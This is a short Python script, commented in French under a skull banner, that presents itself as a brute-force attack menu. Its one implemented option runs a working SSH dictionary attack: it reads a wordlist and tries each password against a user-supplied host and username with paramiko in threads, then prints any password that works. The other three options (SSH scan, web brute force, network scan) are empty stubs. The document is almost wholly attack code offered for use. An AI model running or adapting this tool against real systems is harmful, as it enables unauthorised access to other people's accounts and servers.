##BruteForce
##########################################
##		Tollanar		##
##########################################


import paramiko, sys, os, socket
import threading, time
from colorama import Fore







 

print(Fore.RED + """
__________________________________________________
__________________________________________________
__________________10000000000011__________________
_______________10000000000000000001_______________
_____________00000000000000000000000______________
____________00000111000000001111100001____________
__________10001_______10001_______10001___________
_________1000__________11___________000___________
_________0001_____101_______11______1000__________
_________000______101_______11______1000__________
________10001___________1___________10001_________
________100001_________101_________100001_________
________10000001_____1000001_____10000001_________
_________0000000000000000000000000000000__________
_________1000000000001______100000000000__________
__________000000001____________100000001__________
___________0000001______________1000001___________
____________00000____10000001____00001____________
_____________0000__100000000000_1001____111_______
______1________0000000000000000001_____00000______
_____00000________11000000000001____1000000011____
_____00000001_____________________100000000000____
____0000000000001______________100000000000001____
____000000000000000011_____110000111______________
_________________0100000000000011__1______________
___________11_1100000001___1100000000000000001____
____0000000000000001___________110000000000000____
____00000000000011_________________110000000011___
_____000000001_________________________1000001____
_____100001_______________________________1001____
_______11_________________________________________

""")

var=0


print(Fore.WHITE + """ Bienvenue dans ce script concernant les attaques par Bruteforce SSh et Web""")





choix =int(input (""" 
1- Bruteforce SSH par bibliothèque
2- Scan SSH du réseau
3- Bruteforce Web par bibliothèque
4- Scan réseau
"""))



if choix == 1 :
	print (" Vous avez décider une attaque Bruteforce SSH par bibliothèque")
	print (" 		[+] Chargement en cours [+] ")


	def ssh_connect(password, code=0):
	    global var
	    ssh = paramiko.SSHClient()
	    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
	    try:
	        ssh.connect(host,port=22, username=username, password=password)
	        var = 1
	        print(Fore.GREEN + '[+] Mot de passe trouvé : ' + password + ' , pour le compte : ' + username)
	    except:
	        print(Fore.RED + '[-] L identifiant n\'est pas bon ou le mot de passe n\'es pas : ' + password)
	    ssh.close()
    


	host = input('[+] Addresse de la cible: ')
	username = input('[+] Nom d\'utilisateur de la cible : ')
	input_file = input('[*] Dictionaire de mot de passe a utiliser : ')
	print('\n')

	if os.path.exists(input_file) == False:
	    print(Fore.RED + '[!] Le dictionaire n\'a pas été trouvé')
	    sys.exit(1)

	print(' ..... démarrage de l\'attaque par Bruteforce sur : ' + host + ' avec le compte : ' + username + ' .....\n')

	with open(input_file, 'r') as file:
	    for line in file.readlines():
	        if var == 1:
	            t.join()
	            exit()
	        password = line.strip()
	        t=threading.Thread(target=ssh_connect, args=(password,)) 
	        t.start()
	        time.sleep(0.4)







elif choix == 2 :
	print (" Vous avez décider d'éffectuer un scan SSH")


elif choix == 3 :
	print (" Vous avez choisi une attaque  Brutefroce Web par bibliothè ")

elif choix == 4 :
	print (" Vous avez choisi un scan réseau ")

else :
	print ( " Veuillez recommencer je n'ai pas compris ce que vous demandez ")




